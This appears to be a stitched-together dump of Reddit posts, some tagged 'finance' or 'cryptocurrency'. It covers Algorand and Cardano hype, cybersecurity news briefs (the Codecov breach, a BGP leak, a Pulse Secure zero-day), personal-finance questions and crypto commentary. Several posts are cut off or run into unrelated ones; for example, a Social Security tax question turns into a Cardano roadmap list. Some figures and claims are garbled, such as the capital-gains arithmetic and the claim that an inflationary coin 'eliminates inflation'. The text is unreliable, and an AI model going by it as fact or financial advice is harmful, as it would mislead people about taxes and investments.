4. Literally just this morning, right before I sat down to write this post the first thing I saw was an article post from AlgoOfficial. This article said Algorand is committed to being the greenest blockchain. Apparently, we're already operating close to carbon-neutral. I honestly did not know this and I love to hear it. We've probably all heard the bitcoin ""FUD"" about the electricity intensive network, glad to know that won't be a problem for us. The article also discusses a plan to move Algo towards operating carbon-negative, which I see as very important in this analysis. With the new presidency, we've already seen a large prioritization of reducing emissions. Algorand operating carbon-neutral with the plan to go carbon-negative is huge here. Banking and financial systems certainly use a boatload of electricity. If we had our dollar and markets running on Algorand, we would likely see a LARGE decrease in emissions from the financial sector. I see this as a win-win for the government here: a more efficient and transparent financial system that operates at a much smaller level of energy consumption. ([Link to the article here](https://www.businesswire.com/news/home/20210422005075/en/Algorand-Pledges-to-be-the-Greenest-Blockchain-with-a-Carbon-Negative-Network-Now-and-in-the-Future))
5. Our first additional point comes thanks to u/ApuLivesMatter. Algorand is one of few cryptos that is ISO20022 compliant. This is a relatively new financial standard that has seen increased adoption as financial systems move further to digital. "" The standard reduces complexity, cost and the risk of data manipulation and conversion in the interbank space and between banks and their customers. "" It also is apparently good for enforcing compliance and regulation. I tried searching for other cryptos that meet this standard and the only one that I could find was Ripple. I'm sure there's at least a few more so if anyone has more info please point me in the right direction, but I don't really have time to dig deeper as of now.  ""The ISO 20022 coins are XRP, ALGO, XLM, IOTA, XDC. ""&lt;- thanks to u/suzoh for this one!

&amp;#x200B;

&amp;#x200B;

And I'm sure there's even more breadcrumbs around that I'm forgetting or just completely don't know of. So, what are your guys thoughts? Agree, disagree, let's discuss! Feel free to let me know if there's anything I missed that you feel should be on this list and I could add it to hopefully further stimulate discussion. I look forward to discussing with some of you guys in the comments if more than 3 people see this, but right now I have a lab report and finals to work on.

Have a great day Algonauts! I'll leave with you with one word to describe my personal sentiment...

## Codecov discloses 2.5-month-long supply chain attack

Codecov, a software company that provides code testing and code statistics solutions, disclosed on Thursday a major security breach after a threat actor managed to breach its platform and add a credentials harvester to one of its tools. The impacted product is named *Bash Uploader* and allows Codecov customers to submit code coverage reports to the company’s platform for analysis. Codecov said the breach occurred “because of an error in Codecov’s Docker image creation process that allowed the actor to extract the credential required to modify our Bash Uploader script.” The breach is already drawing comparisons to SolarWinds due to the potential for follow-on effects at companies who use Codecov as a supplier.

## Major BGP leak disrupts thousands of networks globally

A large Border Gateway Protocol (BGP) routing leak that occurred on April 16 disrupted the connectivity for thousands of major networks and websites around the world. Although it happened in Vodafone’s autonomous network based in India, it impacted several U.S. companies, including Google. Although lasting for just 10 minutes, BGP leaks are serious occurrences as they can lead to users being moved to an internet route with suboptimal performance or piracy activities such as eavesdropping and traffic analysis.

## WordPress says FLoC is a security concern

The company announced it will treat Google’s third-party cookie alternative Federated Learning of Cohorts, or FLoC, as a security concern, and proposed blocking the technology by default starting with WordPress 5.8, and considering backporting the block to earlier versions. This block could be overwritten in code by site admins, and WordPress is considering adding a setting to enable FLoC directly. WordPress said its concern is that enabling FLoC by default would make site owners accept it without fully realizing what FLoC is storing and collecting about users. The update to block FLoC is expected by July 2021, although WordPress is currently taking user feedback on the decision.

## Medtonic partners with Sternum on pacemaker security

The medical device maker announced it will work with the IoT cybersecurity startup Sternum to help prevent its pacemakers from getting hacked through their internet-based software updating systems. Medtonic’s previous solution to the problem was simply to disconnect the pacemakers from the updating system, but did not consider that a long-term solution. Sternum claims to offer “autonomous security that operates from within the device that can protect it without the need to update and patch vulnerabilities.” A spokesperson said this would mitigate risks not just to patients, but also prevent pacemakers from being used as an attack vector on a medical systems overall network.

## Biden administration unveils plan to defend electric sector from cyberattacks

The Department of Energy (DOE) yesterday announced a 100-day plan to help shore up the U.S. electric power system against cyber threats. The plan, rolled out with the private sector CISA, is meant to help owners and operators develop more comprehensive approaches to detection, mitigation and forensic capabilities. The plan, will focus on getting industrial control system (ICS) owners and operators to select and use technologies that will help gain real-time awareness of cyber threats, and response capabilities, and will also be encouraging the deployment of technologies that boost visibility into threats in both ICS and operational technology networks.

## Pulse Secure VPN zero-day used to hack defense firms, govt orgs

Pulse Secure has shared mitigation measures for a zero-day authentication bypass vulnerability in the Pulse Connect Secure SSL VPN appliance actively exploited against US Defense Industrial base (DIB) networks and worldwide organizations. To mitigate the vulnerability tracked as CVE-2021-22893 (with a maximum 10/10 severity score), Pulse Secure advises customers to upgrade their server software. As a workaround, the vulnerability can be mitigated on some gateways by disabling Windows File Share Browser and Pulse Secure Collaboration features using instructions available in their security advisory.

personalfinance,Finance or pay off new car?,"Backstory: 28 yr old, single, make 60k year currently. No debts. No large monthly expenses (live with parents for the time still work a lot around property as payment to them for various things phone, utility usage, etc). Currently looking for a house 220k or less with zero luck in current my area. Have 97k savings. Saving about $1000 per paycheck I receive every other week. State government job with pension.

I purchased a new truck after selling the two paid off cars I had (insurance was getting rough for both combined + space issues) after both trade ins, I financed 29k at $565 a month for 60 months. I have plenty of money to just pay it off, and I can't imagine that going through finance and paying interest is worth it. My credit score is high enough and built well. Is there any benefit to sticking with financing? First payment isn't due until mid next month.

I have plenty of money I think for a 20% down payment on a beater house afterwards plus left over for renovations which I plan to do myself (partial reason I needed a truck, other reasons is for property maintenance, hobbies, trailer towing, camping, etc.)

personalfinance,How to adjust withholding on the new W-4 Federal,"I used to adjust my tax withholding using the number of dependents so that I do not have to get my money refunded every tax return season. I'd rather owe, you know.  


But I changed my job in 2020, and I did not adjust this for federal because I could not find it on the form. And this tax return I got some money to get refunded, which has been ""processing"" over two months....  


Anyway, I reached out to the HR where to add that on Federal (I already did for State) and was told the W-4 Federal has changed since 2020, and it doesn't have the dependents anymore.  


All I see is: Filing Status, Multiple Jobs or Spouse Works, Dependent Amount, Other Income Amount, Deduction Amount, and Extra Withholding Amount.  


1. I assume it is ""Deduction Amount"" that I wanna put the withholding amount in, is it right?
2. And is this for year-to-date number or per-paycheck withholding number?
3. How do I find this perfect amount to avoid getting a refund next tax return? I see the W-4 calculator ([https://www.irs.gov/individuals/tax-withholding-estimator](https://www.irs.gov/individuals/tax-withholding-estimator)) but what is this aiming for? $0 tax refund like I want? It kind of aligns with what I wanted this year's Year-to-Date Federal Withholding to be, but again I am not sure what to put in where in my company's W-4 form page like in my q1 and q2.  

&amp;#x200B;

I look at my current paycheck's earning statement, I already paid $14,000 for federal tax withholding. Around same time last year at my previous job, I had paid half of it as a Year-to-Date Federal Withholding tax. I am certainly making more as well but I need to change the W-4 to withhold less and bring home more every paycheck.

personalfinance,How should I manage my military stipend while in dental school?,"Hey all.

Or should I utilize the deferrement on my loans while I'm in dental school as an opportunity to grow my savings as much as possible and then pay off the loans after I graduate? Or is it best to do something in between, where I max out my IRA and throw the rest at loans? Any insight on this would be much appreciated. Thanks!",finance

Bitcoin,"When all the possible BTC is mined and in circulation, what methods will the government use to manipulate the market through?","**TL;DR**: Isn't BTC doomed to fail once it has been fully mined, is exposed to deflation, and as a result, no longer circulates? Thus, showing people that BTC is not a useful currency after all?

&amp;#x200B;

I would be grateful if someone could clarify these concerns about BTC I have, as I learn more about it.

1. As said in the title, when all the possible BTC is mined and in circulation, what methods will the government use to manipulate the market? Would they even be able to manipulate the market if they can't print more money?
2. Since the government can't print BTC like they can with the US dollar, why would the government ever accept BTC as a viable currency? In other words, if the government can't manipulate the economy in the same way they can with the US dollar, it seems to me that the government wouldn't ever accept BTC to be a primary form of currency (like the USD).
3. Currently, whenever the US faces an economic downturn, the Federal Reserve prints money to 'stimulate' the economy, but it seems like an economic system using BTC as its primary currency won't be able to deal with economic downturns by printing more money. If this line of reasoning is correct, is it *actually* a better alternative to have an economic system where the currency can't be inflated? Isn't it, to some degree, 'safer' to have a currency which can stimulate the economy by printing more money?
4. I also have another question with regards to the deflationary argument against BTC. Suppose that all the BTC that exists has been mined. A lot of people will hold BTC, and because no more BTC will enter the market, the value of BTC will perpetually deflate. If BTC deflates, everyone will hold on to their BTC, since it will hold greater value in the future than it does today. Wouldn't this make BTC a currency which disincentives consumer spending. Isn't this, in the long run, bad for the economy?
5. If what I've said in 4) is true, that BTC won't be traded *or* used as a currency during a period of deflation, then wouldn't people realize that the utility of BTC is actually not as prevalent as people thought it was? In other words, BTC is currently being marketed as a new form of currency, but if it will inevitable fail as a working currency in the future, then isn't it prone to collapse?

So, if all the BTC is mined, BTC will deflate, and if people hold on to BTC due to deflation, then people will realize that BTC actually isn't a very useful currency. If people realize that BTC isn't actually a useful currency, then wouldn't BTC crash?

I hope these are good (and justified) questions about BTC. Thanks in advance :)",cryptocurrency

CryptoCurrency,(OC) Hopefully helpful post on how capital gains are not as high as you think (at least from a Canadian perspective) and how capital gains taxes are not a direct 1-1 tax on your profits,"Hi everyone, 1st post in the subreddit and I hope to contribute and give back because of all the amazing OC I've read here. I am not a financial advisor, but there is a lot of concern in the subbreddit regarding capital gains. There is also quite a bit of confusion and misunderstanding going around. I hope to help out. Please feel free to correct me if wrong from any experts

This post has 2 objectives:

1. Clear up some common misunderstandings on how capital gains work in a marginal or progressive tax rate country.
2. Show how even with increases to capital gain taxes or high capital gains taxes, that the additional taxes are not onerous even in a high capital gains tax country like Canada (50% capital gains tax)

&amp;#x200B;

Disclosure: am Canadian, and our system is a marginal tax rate system.

&amp;#x200B;

Capital gains taxes are solely on your profits, never the principal. In Canada, we are taxed at 50% of capital gains. This is relatively high compared to the US. There is no distinction in Canada of short-term or long-term capital gains. Regardless of how you long you've held your investment, it will be taxed at 50% (we have Tax Free Savings Accounts and Registered Retirement Savings Accounts to shelter traditional investment vehicles from taxes).

**However, the tax burden is not 1 to 1** capital gains and you all need to chill out a bit. I hope this helps you better understand how increases in capital gains taxes affect your tax bracket and **it does not mean** **you pay 50% of profits to taxes now, it is actually much, much less**

&amp;#x200B;

How most people think *(incorrectly)* how taxes work on capital gains:

1. $100 invested becomes $200. $100 profit.
2. Taxed on the $100 @ 39% = **$39 in taxes**

&amp;#x200B;

How capital gains and taxes work in marginal tax rate countries:

1. $100 invested becomes $200. $100 profit.
2. $100 of *taxable income* added to taxable income for year
3. Therefore, this $100 is subject to your marginal tax bracket. (see link below) In Canada, this can range from **15% on your 1st $49020** of taxable income, up to **33% of taxable income over $216,511**.
4. In Canada, this means, that $100 profit is subject to 50% capital gains. In other words, 50% of profit is added as taxable income. Lets look how this works out.
5. If you made less than $49020, that $100 in profit =*$50 additional taxable income.* Therefore your additional tax burden at 15% is now: (50\*0.15) **=$7.5 in tax on $100 profit at the lowest tax bracket**
6. Lets say you are wealthy and make over $216,511. Then $100 in profit =$50 in additional taxable income at 33% (50\*0.33) =**$16.66 in tax on absolute highest tax bracket**

All this is to say. I know Canada and the US and the World all have vastly different federal/national/provincial/state etc tax systems. If you live in a marginal or progressive tax country, your tax burden is far less than you think.

Everyone needs to chill out.

&amp;#x200B;

Edit\* Great example posted below and my breakdown on how a $1,000,000 profit works at 50% capital gains

&gt;Lets break this down in federal taxes (at least in Canada):  
&gt;  
&gt;$1 million capital gains = $500,000 in taxable income.  
&gt;  
&gt;15% on $49020 = $7353 in taxes  
&gt;  
&gt;20.5% on next $49020 = $10,049.10 in taxes (total: $17,402.10)  
&gt;  
&gt;26% on the next $53,939 = $14,024.14 in taxes (total: $31,426.24)  
&gt;  
&gt;29% on the next $64,533 = $18,714.57 in taxes (total: $50,140.81)  
&gt;  
&gt;*So far, we have paid $50,140.81 in taxes on $216,511 in taxable income. So approximately* ***23.15% in taxes, far less than the 33%***  
&gt;  
&gt;33% of $283,489 = $93,551.37 in taxes **(total: $143,692.18)**  
&gt;  
&gt;**In this hypothetical situation of a $100000 in profits and 50% capital gains tax, we have paid only $143,692 in taxes or just $14.37% (143,692/1,000,000), much less than \~$330,000 in your example.**

dogecoin,Why Dogecoin Could Be a Real Valuable Currency - Inflationary Behavior is Overblown,"This is a pure speculation from my end but hear me out. Many analysts look down at dogecoin because of its inflationary behavior compared to the Bitcoin. However, no one speaks bad about the dollar, euro or any other currency although the central banks manufacture artificial inflation for those currencies for various economical reasons. Therefore, considering the inflationary behavior of dogecoin as bad isn’t exactly correct. It would only be correct if the inflationary behavior of Dogecoin is extreme but that’s not the case. 

The federal reserve of the US targets 2% inflation for the US dollar annually. Let’s compare that the the current inflationary behavior of dogecoin. 

There are currently 129 billion dogecoin out there. Furthermore, there are 14.4 million dogecoin added daily amounting to 5,456 million annually due to mining activities. This amounts to an annual inflation rate of   5,456 million / 129,000 million = 4.2%. This inflationary behavior is not too bad considering the manufactured inflation rates by central banks of over 2% annually. At least there is no central banks manipulation for the dogecoin. 

Important note: I’m by no mean an expert in Dogecoin or any other cryptocurrencies or financial assets but I conducted simple analysis for my own benefit and figured I’d share it. This is not an advice to buy dogecoin or any other asset. Dogecoin could still be a gamble unless it gets adopted by various entities as a currency.

**Initial Thoughts**

Mr. Market is a bipolar man who comes to your door each day and offers you a price for your dogecoin.  Now Mr. Market is giving you prices derived from lucky coin and inherently bitcoin, so they have an adverse affect on his mood for the day.  You have three options each day when you say hello to Mr. Market; you can decide to buy at the price he gives you, or sell at the price he gives you.  He is known to be quite persuasive and cause you to doubt yourself about your decision; but remember, you have three options, the third being you don't have to even talk to Mr. Market.  He'll talk all day long and tell you about all his issues throughout the day, whether it be his money laundering scheme or that he's being trashed on TV.  Mr. Market deals in different time frames than we do, time moves faster for him, years turn to months and weeks to days.  

&amp;#x200B;

**Macroeconomic Forecast**

The use of Dogecoin as a currency is a viable option for an endlessly growing population.  By acting as an inflationary currency, it essentially eliminates inflation by making it static.  Along with an unlimited amount of Dogecoin that can be mined over time, it would serve as a long term global currency.  The dilemma for central banks currently is they feel the need to manipulate interest rates and print money.  The reason behind this being when the short term debt cycle comes due and a recession ensues, unemployment rises and by default inflation follows from money being printed to stimulate the market.  The question that arises, ""Why would Dogecoin or cryptocurrencies prevent this?""  They don't prevent long and short term debt cycles.  What an inflationary currency does is keep inflation static.  ""What happens when the long and short term debt cycles reach their recessionary phase?"" The government steps in at this point to create work projects for companies, who receive subsidized loans to hire and retain employees.

Bitcoin,Will Sell for Land (And Nothing Else),"I've been hodling long enough for my friends to think I'm a genius, then an idiot, then a super genius, then a soup-brained idiot. I'm not sure why I've never sold so much as one sat, despite not having an exit strategy. Well I have one now.

I recently came to the conclusion that the one and only thing that will get me to budge off my stack is to buy a sizable piece of land in a state of my choosing, upon which I will build my modest dream citadel.

FUDers and los federales STAY MAD. This is a pursuit of generational wealth and your way does not work for people like me.

Banking,[US] Help me decipher the loan amortization schedule on my auto loan.,"#### Help me decipher the loan amortization schedule on my auto loan.

| Loan Amount | Interest Rate | Loan Term [ in months ] |
| ----------- | ----------- | ----------- |
| $5,985.00 | 4.74% | 60 |

Additionally,

| Single Life Insurance | Single Disability Insurance |
| ----------- | ----------- |
| $0.61	per $1000 of Monthly balance | $1.83	per $1000 of Monthly balance |

The monthly payment was fixed at the time of signing, to $121.00, which as per the bank's calculation, ensures that the loan would be paid off within 60 payments. I can however, always pay more and close the loan off earlier.

Now, the summary of the payment for the first 4 months is given below (which I collected from the statements for those months)... I wanted to calculate every column for every month going forward.

| Month	| Outstanding Balance | Disability Insurance Premium	| Life Insurance Premium	| Total Outstanding	| Principal	| Interest	| Monthly Payment | Remaining Outstanding |
| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
|  | a = h | b = $1.83 x (a/1000) | c = $0.61 x (a/1000) | d = a + b + c | e | f | g (fixed) | h = d - e |
| 1	| $5,985.00 | $10.95 | $3.65 | $5,999.60 | $92.20 | $28.80 | $121.00 | $5,907.40 | 0.0 |
| 2	| $5,907.40 | $10.81 | $3.60 | $5,921.82 | $94.10 | $26.90 | $121.00 | $5,827.72 |
| 3	| $5,827.72 | $10.66 | $3.55 | $5,841.94 | $100.53| $20.47 | $121.00 |	 $5,741.41 |
| 4	| $5,741.41 | $10.51 | $3.50 | $5,755.42 | $103.08| $17.92 | $121.00 |	 $5,652.34 |

I want to understand how the bank calculate the principal and interest (column e and f) part of every monthly payment. I called the customer care but they were not helpful in explaining me the math.

Please let me know if you need any other info.",finance
personalfinance,Need some advice on what to do with my vehicle,"About 18 months ago I bought a brand new 2019 Dodge Challenger Hellcat Redeye Widebody. With taxes, title, registration, etc. I paid 74k. I got a really good deal on it, I think I saved like 18.5k. I took it to the dealership the other day for an oil change and they offered to buy it back for 69.5k with 12,800\~ miles on it. My car payment is $988 a month. I have an 8.67% interest rate and still owe 50.2k.

Times have been tough lately and I have barely been able to afford the monthly payments. I can continue to afford them but barely. Just in interest I am paying about $400 a month right now. I am very tempted to save the 1.5k a month(car payment, gas, insurance) and make the 19.7k back in cash after the loan is paid off. I love the car so much but I feel like this could be a decent chance to just get out of it all. It sucks having an 8.67% interest rate on a 50,000 dollar loan.

Refinancing is off the table so its either keep it @ 988 a month with a 8.67% percent interest rate on a $50,000 loan or sell it and get 20k cash back. Just wanted some advice.",finance
CryptoCurrency,Some of the most silly and downright weird coins,"With over 10,000 coins currently in existence and even more being created almost everyday, the crypto space has it's fair share of both serious, playful and even downright silly coins over the years. From Potcoin &amp; porn coins to Trump coin &amp; Putin Coin.

# Dogecoin (DOGE)
Who hasn't heard of the OG memecoin currently getting even more attention than other top ranked coins like Bitcoin, Ethereum and the likes? Dogecoin started out as a joke based on the popular Doge meme in 2013 but is now ranked No. 6, right over many other coins backed by ""great projects"" and ""better fundamentals"". Ouch!

It's is based on the popular ""doge"" Internet meme and features a Shiba Inu on its logo. The open-source digital currency was created by Billy Markus from Portland, Oregon and Jackson Palmer from Sydney, Australia, and was forked from Litecoin. Dogecoin's creators envisaged it as a fun, light-hearted cryptocurrency that would have greater appeal beyond the core Bitcoin audience, since it was based on a dog meme. Tesla CEO Elon Musk continues to post several tweets on social media about Dogecoin; most of which greatly affect price actions.

# Potcoin
Potcoin was created by Joel Yaffe in 2014 as a solution to traditional banking issues for the legal marijuana industry. Because of federal drug laws in place at the time in the United States, the industry generally operated on a cash basis. Potcoin was initially very similar to Litecoin, but changed its mining algorithm from Proof-of-Work to a Proof-of-Stake-Velocity algorithm which takes the activity of the cryptocurrency holder into account while accumulating a new block.

# Unobtanium (UNO)
Unobtanium markets itself as ‘the platinum to Bitcoin’s gold’, ‘something to acquire and hold over a long period of time, similar to precious metals’. The precious metal allegory doesn’t stop there – quantities of Uno are measured in ‘kgs’. Only 250,000 Uno have been made available for mining over the next 300 years, making them rare – really rare. . While this may seem like a flimsy premise, it appears to be working. Unlike many other cryptocurrencies, Unobtanium has seen a net increase in value over the course of 2018. At the height of the crypto boom during the end of 2017, it had a market cap of over $75m.
A collector’s novelty or a genuine cryptocurrency? You decide.

# Putincoin (PUT)
PutinCoin is a ridiculously patriotic cryptocurrency dedicated to honor the Russian President Vladimir Putin. It was developed ""to pay tribute to the people and president of one of the largest and greatest countries in the world - Russia!"" Although Mr Putin himself appears not to have commented on its existence, Putincoin nevertheless styles itself as a national cryptocurrency for Russia, citing the fast-growing economy as the reason it is needed.

Aside from its dedication to Russia, there is not much else that is noteworthy about Putincoin. Despite this, it has been going for more than two years at the time of writing, reaching a market cap of more than $11m at its peak.

# TrumpCoin (TRUMP)
Of course Trump also has a cryptocurrency. TrumpCoin describes itself as a cryptocurrency supporting the Trump administration and its conservative followers and Patriots. Its crowdfunding blockchain provides funding and recognition for Patriots utilizing PatriotNodes and PoS mining. 

200,000 of the six million available TrumpCoins have been set aside for donation to the Trump administration once the currency reaches ‘a substantial value’ – because even billionaire statesmen could always use a little cash injection. Yeah, why not further enlarge the pockets of the elite lol.

There are dozens of other failed or dubious-looking political currencies floating around the web. Billary Coin, Ron Paul Coin, French presidential race coins for Emmanuel Macron and Marine Le Pen, and more.

# Cthulhu Offerings (OFF)
Probably the weirdest in this list, so get ready for some really cringe-worthy stuff. 
Cthulhu is a fictional cosmic entity created by writer H. P. Lovecraft. He sleeps under the Pacific Ocean, awaiting release by his loyal cultists. Over the years, Clthulhu has grown a rather large fan base.

The cryptocurrency was announced back in September 2013 by a user called Blazr2 on the cryptocurrency forum Bitcointalk. The growth of OFF has been slow but steady since then. The “ritual” refers to the distribution of coins, or OFF. Like with the other cryptocurrencies such as Bitcoin, users can run the OFF client to mine more coins. 

Coins are “offerings” or “blessings” by OFF users. The users themselves are called “cultists,” and mining is done via “sacrifices.” Who could ever imagine a whole spiritual realm existing on a blockchain?

And what's more? The price is currently $0.00 lol!

# Whoppercoin
Last year, Burger King Russia announced the Whoppercoin initiative...basically a blockchain-based rewards program. Customers rack up one Whoppercoin for each ruble they spend, and those who accrue 1,700 Whoppercoins get a free burger. What a great deal!

# Useless Ethereum Token (UET)
Okay, heads-up. This one definitely isn't apologizing for being weird. Seriously, why even bother? 

UET is exactly what it sounds like: a first-of-its-kind initial coin offering (ICO) that transparently offers investors absolutely no value; a middle finger aimed squarely at all other cryptocurrencies. Don't just take it from me. The website states: ""You're going to give some random person on the internet money, and they're going to take it and go buy stuff with it. Probably electronics, to be honest. Maybe even a big-screen television. Seriously, don't buy these tokens."" 

Surely, a lot of work just to prove a stupid point lol.

# Mooncoin 
Mooncoin is a cryptocurrency and blockchain network where the total coin supply is limited, based upon the average distance from the Earth to the moon. Interesting. It’s also got its own programming language called MoonWord for decentralized app (DApp) coding and blockchain record-keeping. We bet the Moonman himself would approve.


# Porn Coins
There are quite a few cryptocurrencies dedicated to the adult entertainment industry. SexCoin and TitCoin are both designed for product purchases and transactions on porn sites. SpankChain goes even further, providing a full-blown blockchain infrastructure platform for building secure, anonymous pornography apps. What a time to be alive.

# Coinye
Famous for its short life as much as its libelous premise, rhis doomed cryptocurrency was sued into oblivion by Kanye West's lawyers. Released on January 7th, 2014 as ‘Coinye West’, this script-based cryptocurrency featured famously-lighthearted rapper Kanye West as its mascot – without his permission. A trademark infringement lawsuit swiftly followed. Even changing the name to ‘Coinye’ and replacing West’s likeness with that of a ‘half-man-half-fish hybrid’ could not delay the inevitable, and by January 14th – a mere week after release – Coinye was no more. Coinye developer Harry Willis later recounted, “I’ve never had someone try and sue me before, let alone an A-list celebrity. We didn’t win, but we’ve cost Mr. West thousands in legal fees which is a great feeling.”

There are still tons of downright weird cryptocurrencies not included in this list. The obvious advice here would be to steer clear of coins like these if you're highrisk-averse and don't wanna see yourself get burned overnight. What others have you heard of or come across?",cryptocurrency
CryptoCurrency,My take on the printer go Brrr versus inflation (taxation versus interest rates),"There are ways to counteract printing money and inflation. The most known is raising interest rates. The fed said they won't do that anytime soon.

Well there's another way. Tax! So the news about increasing taxes will not just hit investors but also the economy by directly combating inflation by sucking money out of the system as it moves from person to person.

Just my 2c in why today went down. It's not just people being afraid to pay more, but the speculation that more tax will come and inflation will be kept in check.

I don't think they'll manage it properly and the drop is overblown. Just wanted to point out the complexity.

Happy to hear what you smarter folks think as well.",cryptocurrency
Trading,Tax Gains Because Of What’s To Come?,"If President Biden plans to pay for everything with increased capital gains tax and/or wealth tax, then the US stock market just officially became the most systemic, too-big-to-fail public utility on the planet. Taxes on capital gains investment is an indirect way for the US government to harvest inflation which is best expressed through asset prices. The Biden Administration may be setting the stage for what they know is to come (it’s within their means to create it), an unprecedented multi-year bull run for capital markets. 

By raising taxes, the government has painted themselves into a corner that makes easy monetary policy (politically expedient i.e. friendly interest rates) a necessity, which is good for asset prices in the long run (otherwise the US is draining out of the system what they pumped in, leading to tight fiscal policy and tight monetary policy, which inevitably pushes the US debt cost overboard - remember that foreigners are no longer keen on financing US debt, evidenced through weak Treasury buying). 

In the grand scheme of things, we think there is little chance the bill will pass this early in the cycle.",finance

personalfinance,Should Social Security and Medicare taxes be withheld from non-taxable income?,"This is an impossible question for me to google, all the hits are whether Social Security is taxable.

My wife and I are adopting a baby, and through work I have Progyny adoption assistance. We submitted for our max allowable reimbursement of $25,000, which was sent along to my company and then paid to me via my paycheck along with my normal pay. It appears under the Non-Taxable earnings section of my paystub, and my federal tax withholding is normal, ie its the same as my last paycheck.

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel.

4. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds.

8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher.

But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain!

30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
